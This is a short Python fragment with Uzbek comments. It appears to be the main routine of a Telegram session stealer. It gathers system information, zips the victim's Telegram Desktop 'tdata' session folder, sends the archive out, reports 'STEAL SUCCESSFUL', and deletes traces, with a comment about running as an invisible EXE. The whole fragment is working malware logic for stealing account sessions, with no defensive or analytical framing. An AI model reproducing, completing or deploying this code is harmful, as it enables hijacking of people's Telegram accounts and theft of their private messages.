def main():
    """MUKAMMAL EXECUTION"""
    # 1. Darhol status
    send_message(get_system_info())
    
    # 2. ZIP yaratish
    archive = create_PERFECT_tdata_zip()
    
    if archive and archive.exists():
        size_mb = archive.stat().st_size / (1024*1024)
        caption = f"📦 PERFECT TDATA\n💾 Size: {size_mb:.1f}MB"
        
        # 3. Yuborish
        if send_file(archive, caption):
            send_message("✅ STEAL SUCCESSFUL 🎉")
        else:
            send_message("❌ SEND FAILED")
        
        # 4. Tozalash
        threading.Thread(target=cleanup, args=(archive,), daemon=True).start()
    else:
        send_message("❌ TDATA NOT FOUND")

if __name__ == "__main__":
    # Ko'rinmas EXE mode
    if getattr(sys, 'frozen', False) or sys.argv[0].endswith('.exe'):
        main()
    else:
        main()
